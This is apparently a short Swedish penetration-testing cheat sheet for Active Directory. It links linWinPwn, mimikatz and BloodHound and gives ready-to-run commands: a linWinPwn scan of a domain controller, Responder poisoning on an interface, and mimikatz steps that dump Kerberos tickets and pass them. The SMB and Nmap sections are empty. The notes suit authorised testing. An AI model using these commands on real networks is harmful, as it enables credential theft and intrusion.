# Gunnajs-Playbook
En svensk penetrationsvägvisare

## Tools bby

### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### mimikatz
https://github.com/ParrotSec/mimikatz
### Bloodhound
https://github.com/BloodHoundAD/BloodHound

# VEV

## linWinPwn 
```bash
sudo ./linWinPwn.sh -t <Domän_Kontrollant_IP> -u <AD_konto> -p <AD_lösen>
```

## Responder
```bash
responder -I eth0 -v
```

## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
## SMB VEV
## Nmap
